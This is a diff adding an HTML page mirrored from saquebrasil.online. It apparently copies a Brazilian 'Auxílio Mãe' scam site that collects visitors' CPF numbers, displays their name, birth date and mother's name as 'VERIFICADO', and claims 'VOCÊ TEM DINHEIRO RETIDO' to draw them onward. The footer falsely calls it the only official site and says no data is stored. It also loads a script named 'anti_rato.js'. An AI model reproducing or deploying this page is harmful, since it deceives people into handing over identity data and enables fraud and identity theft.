@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<!-- Mirrored from saquebrasil.online/consultadados/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Sep 2023 05:19:58 GMT -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Auxílio Mãe</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@200;300;500;700;900&amp;family=Libre+Baskerville:wght@700&amp;display=swap"
+          rel="stylesheet">
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/anti_rato.js"></script>
+</head>
+
+<body>
+<header>
+
+    <div>
+        <br>
+        <img src="assets/logo.png" height="100" width="166" alt="" style="padding: 5% 10% 2% 10%"/>
+        <br>
+        
+    </div>
+    <div class="container-header">
+        <h1>
+            VEJA COMO REALIZAR SUA CONSULTA:
+        </h1>
+        <img src="assets/passo1.png" height="131" width="384" style="height: auto;max-width: 100%;border: none;border-radius: 0;box-shadow: none;" alt=""/>
+<br>
+<br>
+    </div>
+
+</header>
+
+<main>
+
+    <div class="container-main">
+        <form action="#">
+            <div class="div-campo">
+                <label for="cpf">CPF:</label>
+                <input type="text" id="cpf" name="cpf" placeholder="POR FAVOR, DIGITE SEU CPF">
+            </div>
+            <label id="cpf-error" class="cpf-error">CPF inválido. Por favor, digite um CPF válido.</label>
+
+            <button id="open-popup" class="invalid-cpf">© CONTINUAR</button>
+            <p>* Não armazenamos os seus dados</p>
+        </form>
+    </div>
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <div id="loading-icon" class="c-loader"></div>
+            <div id="success-message" class="success-message">Dados Verificados com Sucesso</div>
+            <div id="data-content" class="data-content">
+                <img id="data-image" src="assets/logo.png" alt="Imagem de Dados">
+                <br>
+                <span>NOME: </span><label id="label-1"></label>
+                <br>
+                <!--                <span>CPF: </span><label id="label-2"></label>-->
+                <!--                <br>-->
+                <span>NASCIMENTO: </span><label id="label-3"></label>
+                <br>
+                <span>MÃE: </span><label id="label-4"></label>
+                <br>
+                <span>SEXO: </span><label id="label-5"></label>
+                <br>
+                <span style="display:flex; justify-content:center; color: #19d919; margin-top: 10%; font-weight: 900; font-size: 1.2em">VERIFICADO!</span>
+                <br>
+                <span style="display: flex; justify-content: center; margin-top: -6%">VOCÊ TEM DINHEIRO RETIDO</span>
+                <button id="proxima-pagina">QUERO CONSULTAR</button>
+            </div>
+        </div>
+    </div>
+
+</main>
+
+<footer>
+    <div class="container-footer">
+        <!--        <h2>CUIDADO COM GOLPES E PIRATARIA</h2>-->
+        <p class="p-first">Este é o único site oficial com um produto/serviço legítimo.</p>
+        <p>Desconfie de sites estranhos e não aceite contato por e-mail,</p>
+        <p> WhatsApp ou SMS de fontes desconhecidas.</p>
+        <p>Copyright 2023</p>
+        <p>© Todos os Direitos Reservados</p>
+    </div>
+    <div class="links">
+        <a href="#">Termos de Uso |</a>
+
+        <a href="#">Política de Privacidade |</a>
+
+        <a href="#">Termos de Garantia</a>
+    </div>
+</footer>
+<script src="js/script.js"></script>
+<script src="js/popup.html"></script>
+</body>
+
+
+<!-- Mirrored from saquebrasil.online/consultadados/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 05 Sep 2023 05:20:00 GMT -->
+</html>
